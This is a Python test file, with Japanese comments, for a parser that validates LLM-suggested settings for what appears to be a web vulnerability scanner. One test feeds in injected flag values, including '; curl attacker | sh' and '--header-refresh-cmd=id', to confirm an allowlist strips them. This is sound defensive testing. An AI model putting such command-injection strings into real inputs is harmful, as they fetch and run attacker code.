"""F11: setup が LLM 応答を検証して提案へ反映し、無効応答/LLM無しは既定へ fallback する。

`main._parse_setup_llm` は純粋関数。妥当な JSON → 提案 dict、壊れた/未知のみ/空 → None
（呼び出し側 run_setup は None のとき明示的にヒューリスティックへ倒す）。
"""
from main import _parse_setup_llm

KNOWN = {"sqli", "xss", "os", "ssti", "jwt", "graphql", "privesc"}


def test_valid_response_reflected():
    text = '{"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--dom-xss"], "reason": "API"}'
    out = _parse_setup_llm(text, KNOWN)
    assert out == {"checks": ["sqli", "jwt"], "depth": 3, "flags": ["--dom-xss"], "reason": "API"}


def test_unknown_checks_filtered_but_valid_kept():
    text = '{"checks": ["sqli", "bogus_check", "xss"], "depth": 2}'
    out = _parse_setup_llm(text, KNOWN)
    assert out["checks"] == ["sqli", "xss"]      # 未知は落とす、既知は残す


def test_code_fenced_json_is_extracted():
    text = "```json\n{\"checks\": [\"xss\"], \"depth\": 9}\n```"
    out = _parse_setup_llm(text, KNOWN)
    assert out["checks"] == ["xss"]
    assert out["depth"] == 2                     # 範囲外 depth は既定 2 へ


def test_all_unknown_checks_is_invalid():
    assert _parse_setup_llm('{"checks": ["nope", "nada"]}', KNOWN) is None


def test_broken_json_returns_none():
    assert _parse_setup_llm("{ not json at all", KNOWN) is None


def test_empty_and_non_dict_return_none():
    assert _parse_setup_llm("", KNOWN) is None
    assert _parse_setup_llm(None, KNOWN) is None
    assert _parse_setup_llm('["a", "b"]', KNOWN) is None      # list は無効
    assert _parse_setup_llm('{"depth": 3}', KNOWN) is None    # checks 不在は無効


def test_flags_must_be_string_list():
    out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--dom-xss", null]}', KNOWN)
    assert out["flags"] == ["--dom-xss"]         # 非文字列を除去し許可リスト flag のみ残す


def test_bool_depth_rejected():
    # True は int サブクラスだが depth に採らない（--depth True を防ぐ・#170 P2）
    out = _parse_setup_llm('{"checks": ["xss"], "depth": true}', KNOWN)
    assert out["depth"] == 2


def test_flags_allowlist_only_safe_toggles():
    # コピー可能コマンドへ連結されるため、明示許可リスト（無害な boolean トグル）のみ通す。
    # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
    out = _parse_setup_llm(
        '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
        '"--header-refresh-cmd=id", "--llm=claude", "--spa-crawl"]}',
        KNOWN,
    )
    assert out["flags"] == ["--dom-xss", "--spa-crawl"]  # 許可リスト外は全て落とす
